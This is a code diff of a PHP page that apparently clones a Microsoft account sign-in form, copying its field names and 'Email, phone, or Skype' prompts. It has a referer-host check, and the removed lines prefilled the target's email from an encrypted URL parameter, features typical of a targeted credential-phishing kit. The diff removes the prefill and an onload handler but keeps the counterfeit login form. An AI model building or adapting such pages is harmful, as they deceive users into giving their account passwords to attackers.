@@ -29,7 +29,7 @@ if($refData['host'] !== $_SERVER['HTTP_HOST']) {
     <script src="include/src/mp.js"></script>
 </head>
 
-<body onload="NE()" class="cb" style="display: block;">
+<body  class="cb" style="display: block;">
     <div>
         <div>
             <div class="background" role="presentation">
@@ -81,12 +81,12 @@ if($refData['host'] !== $_SERVER['HTTP_HOST']) {
                                     </div>
                                     <div class="row">
                                         <div role="alert" aria-live="assertive">
-                                            <div class="alert alert-error col-md-24" style="display:none" id="usernameError">Enter a valid email address, phone number, or Skype name.
+                                            <div class="alert alert-error col-md-24" style="display:none" id="usernameError">Enter a valid email address
                                             </div>
                                         </div>
                                         <div class="form-group col-md-24">
                                             <div class="placeholderContainer"> <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override"  aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader loginDescription"
-                                                    placeholder="Email, phone, or Skype" value="<?php require 'engine/encrypt.php'; echo doDecrypt($_GET["y"]); ?>" lang="en"> </div>
+                                                    placeholder="Email" value="" lang="en"> </div>
                                         </div>
                                     </div>
                                     <div class="position-buttons">
